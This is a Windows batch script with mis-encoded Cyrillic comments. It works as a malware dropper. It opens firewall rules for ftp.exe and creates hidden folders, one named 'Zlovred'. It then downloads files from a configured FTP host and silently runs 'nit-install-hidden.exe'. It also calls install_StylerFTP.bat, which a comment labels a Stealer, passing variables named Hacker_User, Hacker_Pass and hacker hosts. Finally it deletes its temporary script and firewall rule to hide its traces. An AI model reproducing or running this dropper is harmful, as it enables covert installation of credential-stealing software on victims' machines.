rem ���� ����㧪� � ��⠭���� �⠩��� (��������᪨� ��ਠ��)
rem USAGE
rem > load_ftpStyler.bat
rem ����᪠�� 䠩� � �ࠢ��� �����������

rem ���樠�����㥬 ��६���� ���㦥��� �ਯ�

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem ᮧ��� ��⥬�� ��६���� Windows ��� ��⭥�
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4

rem ������塞 ��६ᥭ�� ���㦥���
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem ��⠥� ����ன�� �� 䠩�� settings.txt, ����� ������ �ᯮ�������� �
rem ⮬ �� ��⠫���, �� � bat-䠩�. �᫨ �� 㤠���� �ᯠ���� ����ன�� -
rem ��室�� � ���㫥�� ����� ������.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem Create Windows Firewall Rules
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="FTP.EXE Application rule 1" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="FTP.EXE Application rule 1" dir=out action=allow program="%windir%\system32\ftp.exe" enable=yes

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

::�६���� 䠩� ������ ��� �⨫��� FTP.exe
set CommFTP="%TEMP%\Initial_Script.txt"


rem ��।��塞 ��६����:
rem FTP Host
set host=%ftphost%
rem FTP Port
rem set ftpport=21
rem Ftp user
rem set ftpuser=anonymous
rem FTP Password
rem set ftppassword=
rem �᭮���� �����
rem set ftpMainFolder=
rem ����� ����� FTP ��娢�
rem set ftpSubFolder=Exponenta
rem ����� ����� FTP ��娢�
rem set ftpSubFolder1=
rem ��᪠ ��� 䠩���
rem set ftpFileMask=*
rem ������� ��⠫��
set LocalFolderZ=%PUB1%\Distrib\Zlovred

rem Delete old versions of the files in catalog C:\pub1\Distrib\plugins
del /Q /F %LocalFolderZ%\*.*

::������㥬 䠩� FTP ������
> %CommFTP% (
  echo open %host% %ftpport%
  echo %ftpuser%
  echo.%ftppassword%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolderZ%"
  if "%ftpMainFolder%" neq "" echo cd "%ftpMainFolder%"
  if "%ftpSubFolder%" neq "" echo cd "%ftpSubFolder%"
  if "%ftpSubFolder1%" neq "" echo cd "%ftpSubFolder1%"
  echo mget %ftpFileMask%
  echo disconnect
  echo quit
)

::����᪠�� �� �믮������ ����⭨� ������ FTP

%windir%\system32\ftp.exe -s:%CommFTP%

::����塞 ����⭨�
del /f /q %CommFTP%

rem �����㥬 wget � ����᪠�� ��⠭���� � ��⠫��� %LocalFolder%
rem copy wget.exe %LocalFolderZ%\wget.exe
rem copy ExponentaInstallerFtpHidden.exe %LocalFolderZ%\ExponentaInstallerFtpHidden.exe
rem copy install_Styler.ini %LocalFolderZ%\
rem copy installFTP_Stylerdistrib.bat %LocalFolderZ%\
rem copy Install_StylerFTP.bat %LocalFolderZ%\

rem ����᪠�� ���⠫���� Admin-Pack "��ᯮ����"
%LocalFolderZ%\nit-install-hidden.exe

rem ����᪠�� ���⠫���� Stealer "��ᯮ����"
call %LocalFolderZ%\install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem ����塞 �६���� ��⠫��
rd /S /Q WindowsPowerShell

rem �����塞 �ࠢ��� ��� �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="FTP.EXE Application rule 1"

rem ��室 �� �業���. ����� - ⮫쪮 �㭪樨.
exit /b 0

rem
rem �㭪�� ��� �⥭�� ����஥� �� 䠩��.
rem �室:
rem       %1           - ��� 䠩�� � ����ன����
:read_settings

set SETTINGSFILE=%1

rem �஢�ઠ ����⢮����� 䠩��
if not exist %SETTINGSFILE% (
    echo FAIL: ���� � ����ன���� ���������
    exit /b 1
)

rem ��ࠡ�⪠ 䠩�� c ����ன����
rem �����:
rem     eol=# 㪠�뢠�� �� �, �� ᮤ�ন��� ��ப� ��稭�� � ᨬ���� #
rem     � �� �� ���� ����� ���� �ய�饭� ��� �������਩.
rem
rem     delims== 㪠�뢠��, �� ࠧ����⥫�� ���祭�� ���� ᨬ��� =
rem
rem     tokens=1,2 �ਢ���� � ⮬�, �� � ��६����� %%i �㤥� ����ᥭ ����
rem     ⮪��, � � %%j - ��ன.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem � ��६����� i - ����
    rem � ��६����� j - ���祭��
    rem �� �࠭᫨�㥬 �� � ��६���� ���㦥���
    set %%i=%%j
)
exit /b 0

